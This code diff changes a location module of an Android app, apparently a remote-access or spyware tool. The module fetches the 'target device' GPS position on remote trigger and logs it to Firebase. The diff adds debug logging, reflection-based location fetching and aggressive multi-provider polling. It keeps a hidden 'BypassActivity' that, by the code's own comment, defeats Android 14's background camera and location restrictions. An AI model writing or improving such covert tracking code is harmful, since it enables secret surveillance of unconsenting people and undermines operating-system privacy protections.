@@ -10,6 +10,7 @@ import android.net.Uri;
 import android.os.Build;
 import android.os.Handler;
 import android.os.Looper;
+import android.util.Log;
 
 import androidx.core.content.ContextCompat;
 
@@ -83,29 +84,39 @@ public class LocateModule extends BaseModule {
     }
 
     private Response serveGpsLocate(Map<String, String> params) {
+        Log.d("LocateModule", "serveGpsLocate triggered");
         FirebaseConfig.logActivity("LOCATE_TRIGGER: Precision GPS uplink initiated");
         boolean hasFineLocation = ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED;
         boolean hasCoarseLocation = ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED;
 
         if (!hasFineLocation && !hasCoarseLocation) {
+            Log.w("LocateModule", "Location permissions missing");
             return params.containsKey("json") ?
                     newResponse(Response.Status.OK, "application/json", "{\"success\": false, \"message\": \"Location permission missing. Use REPAIR_PERMISSIONS in the Hardware tab.\"}") :
                     server.serveErrorProxy("Location permission missing. Use REPAIR_PERMISSIONS in the Hardware tab.");
         }
         
-        try {
-            Intent bypass = new Intent(context, CameraHelper.BypassActivity.class);
-            bypass.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_ANIMATION);
-            context.startActivity(bypass);
-            Thread.sleep(350); 
-        } catch (Exception ignored) {}
+        // Android 14+ background camera/location requirement bypass
+        if (Build.VERSION.SDK_INT >= 34) {
+            try {
+                Intent bypass = new Intent(context, CameraHelper.BypassActivity.class);
+                bypass.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_ANIMATION);
+                context.startActivity(bypass);
+                Thread.sleep(350); 
+            } catch (Exception ignored) {}
+        }
 
         try {
             LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
+            if (locationManager == null) {
+                return server.serveErrorProxy("LocationManager unavailable");
+            }
             
             boolean isGpsEnabled = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
             boolean isNetworkEnabled = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
             
+            Log.d("LocateModule", "GPS enabled: " + isGpsEnabled + ", Network enabled: " + isNetworkEnabled);
+
             if (!isGpsEnabled && !isNetworkEnabled) {
                 String errorMsg = "LOCATION_SERVICES_DISABLED: The device's master location toggle is OFF. Triangle calibration is impossible.";
                 FirebaseConfig.logActivity("LOCATE_ERROR: Master Location Toggle is OFF on target device.");
@@ -116,7 +127,9 @@ public class LocateModule extends BaseModule {
 
             Location location = null;
 
+            // Try last known location first
             List<String> providers = locationManager.getProviders(true);
+            Log.d("LocateModule", "Enabled providers: " + providers);
             for (String provider : providers) {
                 try {
                     Location l = locationManager.getLastKnownLocation(provider);
@@ -127,37 +140,46 @@ public class LocateModule extends BaseModule {
                 } catch (SecurityException ignored) {}
             }
 
+            if (location != null) {
+                long age = System.currentTimeMillis() - location.getTime();
+                Log.d("LocateModule", "Found last known location, age: " + age + "ms");
+                if (age < 30000) { // If less than 30 seconds old, use it immediately
+                    Log.d("LocateModule", "Using fresh last known location");
+                } else {
+                    location = null; // Too old, try fresh fix
+                }
+            }
+
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-                final java.util.concurrent.CountDownLatch latch = new java.util.concurrent.CountDownLatch(1);
-                final Location[] freshLoc = new Location[1];
+                Log.d("LocateModule", "Attempting getCurrentLocation via reflection (API 30+)");
                 try {
                     String provider = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER) 
                                     ? LocationManager.NETWORK_PROVIDER : LocationManager.GPS_PROVIDER;
                     
-                    locationManager.getCurrentLocation(
-                            provider,
-                            null,
-                            ContextCompat.getMainExecutor(context),
-                            loc -> {
-                                freshLoc[0] = loc;
-                                latch.countDown();
-                            });
-                    
-                    latch.await(4, java.util.concurrent.TimeUnit.SECONDS);
-                    if (freshLoc[0] != null) location = freshLoc[0];
-                } catch (Exception ignored) {}
+                    Class<?> helper = Class.forName("com.labs.labrats.Api30Helper");
+                    java.lang.reflect.Method method = helper.getMethod("getCurrentLocation", Context.class, LocationManager.class, String.class);
+                    Location freshLoc = (Location) method.invoke(null, context, locationManager, provider);
+                    if (freshLoc != null) location = freshLoc;
+                } catch (Exception e) {
+                    Log.e("LocateModule", "Reflection error (API 30 location): " + e.getMessage());
+                }
             }
 
             if (location == null) {
+                Log.d("LocateModule", "Attempting requestLocationUpdates fallback");
                 // Fallback for older devices or failed fresh fix: Active request
                 final java.util.concurrent.CountDownLatch latch = new java.util.concurrent.CountDownLatch(1);
                 final Location[] result = new Location[1];
                 final android.location.LocationListener listener = new android.location.LocationListener() {
                     @Override public void onLocationChanged(Location loc) {
                         if (loc != null) {
+                            Log.d("LocateModule", "Location changed: " + loc.getProvider() + ", acc: " + loc.getAccuracy());
                             if (result[0] == null || loc.getAccuracy() < result[0].getAccuracy()) {
                                 result[0] = loc;
-                                if (loc.getAccuracy() < 50) latch.countDown(); // Sufficient accuracy
+                                if (loc.getAccuracy() < 50) {
+                                    Log.d("LocateModule", "Sufficient accuracy achieved");
+                                    latch.countDown(); 
+                                }
                             }
                         }
                     }
@@ -168,18 +190,34 @@ public class LocateModule extends BaseModule {
 
                 new Handler(Looper.getMainLooper()).post(() -> {
                     try {
-                        // Request from both for faster lock on legacy hardware
-                        if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
-                            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, listener, Looper.getMainLooper());
+                        List<String> activeProviders = locationManager.getProviders(true);
+                        Log.d("LocateModule", "Active providers for request: " + activeProviders);
+                        
+                        // Pick best provider for single update
+                        android.location.Criteria criteria = new android.location.Criteria();
+                        criteria.setAccuracy(android.location.Criteria.ACCURACY_FINE);
+                        String best = locationManager.getBestProvider(criteria, true);
+                        if (best != null) {
+                            Log.d("LocateModule", "Best provider: " + best + ", requesting single update");
+                            locationManager.requestSingleUpdate(best, listener, Looper.getMainLooper());
                         }
-                        if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
-                            locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0, 0, listener, Looper.getMainLooper());
+
+                        for (String p : activeProviders) {
+                            if (p.equals(LocationManager.PASSIVE_PROVIDER)) continue;
+                            Log.d("LocateModule", "Requesting regular updates from: " + p);
+                            locationManager.requestLocationUpdates(p, 0, 0, listener, Looper.getMainLooper());
                         }
-                    } catch (SecurityException ignored) {}
+                    } catch (SecurityException e) {
+                        Log.e("LocateModule", "SecurityException during updates request: " + e.getMessage());
+                    }
                 });
 
-                // Increased timeout for legacy satellite locks (12 seconds)
-                try { latch.await(12, java.util.concurrent.TimeUnit.SECONDS); } catch (Exception ignored) {}
+                // Increased timeout for legacy satellite locks (15 seconds)
+                try { 
+                    if (!latch.await(15, java.util.concurrent.TimeUnit.SECONDS)) {
+                        Log.w("LocateModule", "Location fix timed out");
+                    }
+                } catch (Exception ignored) {}
 
                 new Handler(Looper.getMainLooper()).post(() -> {
                     try { locationManager.removeUpdates(listener); } catch (Exception ignored) {}
@@ -189,14 +227,22 @@ public class LocateModule extends BaseModule {
             }
 
             if (location == null) {
-                try {
-                    location = locationManager.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER);
-                } catch (SecurityException ignored) {}
+                Log.d("LocateModule", "Final attempt: checking last known from all providers");
+                for (String p : providers) {
+                    try {
+                        Location l = locationManager.getLastKnownLocation(p);
+                        if (l == null) continue;
+                        if (location == null || l.getTime() > location.getTime()) {
+                            location = l;
+                        }
+                    } catch (SecurityException ignored) {}
+                }
             }
 
             if (location != null) {
                 double lat = location.getLatitude();
                 double lon = location.getLongitude();
+                Log.d("LocateModule", "Success (Provider: " + location.getProvider() + "): " + lat + ", " + lon);
                 
                 LabRatsWorker.execute(() -> {
                     try {
